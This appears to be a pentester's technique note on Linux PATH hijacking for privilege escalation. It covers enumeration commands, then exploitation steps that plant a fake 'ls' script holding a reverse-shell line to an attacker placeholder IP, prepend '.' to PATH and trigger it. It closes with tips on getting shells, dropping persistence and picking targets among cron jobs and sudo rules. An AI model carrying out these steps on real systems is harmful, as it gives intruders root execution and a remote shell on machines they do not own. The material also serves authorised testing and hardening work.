### 1. Technique Name:

Path Abuse
### 2. Summary:

The `$PATH` environment variable defines directories in which the shell looks for executables when a command is run. If a user’s or script’s PATH includes writable directories, especially the current directory (`.`), it is possible to hijack legitimate commands by placing malicious scripts with the same name. This can lead to privilege escalation if a higher-privileged user runs the tampered command.
### 3. Conditions / Requirements:

- Ability to modify the PATH variable or control a directory already in PATH    
- Write permissions to a directory in another user's or script's PATH
- A privileged user or automated script that executes commands from the modified PATH
- (Optional) `.`, the current directory, included early in PATH
### 4. Enumeration Steps:
#### A. Check Current PATH:

```bash
echo $PATH
env | grep PATH
```
#### B. Look for Writable Directories in PATH:

```bash
echo $PATH | tr ':' '\n' | xargs -I{} sh -c 'test -w {} && echo "Writable: {}"'
```
#### C. Identify Scripts/Binaries Called Without Full Path:

Look for scripts run via cron, services, or sudo with commands like `ls`, `cp`, `netstat`, etc., without full paths.
### 5. Exploitation Steps:
#### A. Inject Malicious Binary into PATH:

```bash
cd /tmp
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1' > ls
chmod +x ls
```
#### B. Prepend `.` or Controlled Directory to PATH:

```bash
export PATH=.:$PATH
```
#### C. Trigger the Binary Execution:

Run the command that's being hijacked:

```bash
ls     # Will now trigger /tmp/ls instead of /bin/ls
```
#### D. Privilege Escalation Scenario:

If a root-owned script executes `ls`, `cp`, or `conncheck` without an absolute path, and the attacker can write to a directory earlier in PATH, they can gain root execution of their malicious binary.
### 6. Post-Exploitation Tips:

- Clean up: remove malicious binary, restore original PATH    
- Use this method to get reverse shells or drop persistence binaries
- Monitor `/etc/environment`, `/etc/profile`, or `.bashrc` for persistent PATH changes
### 7. Example / Notes:

- Example of PATH modification and abuse:    

```bash
PATH=.:$PATH
export PATH
echo -e '#!/bin/bash\necho "PATH ABUSE!!"' > ls
chmod +x ls
ls
# Output: PATH ABUSE!!
```

- Example of directory in PATH used for binary:

```bash
pwd && conncheck
# Output shows netstat-like output
```

→ Even though the script was run from `/tmp`, it used `conncheck` from `/usr/local/sbin`.

- Best targets:    
    - Misconfigured cron jobs
    - Poorly written init scripts        
    - Sudo rules like `NOPASSWD: some_script.sh` that don’t use full binary paths
# Tags
> #Linux-Post-Exploitation #Linux-Privesc #PATH_Abuse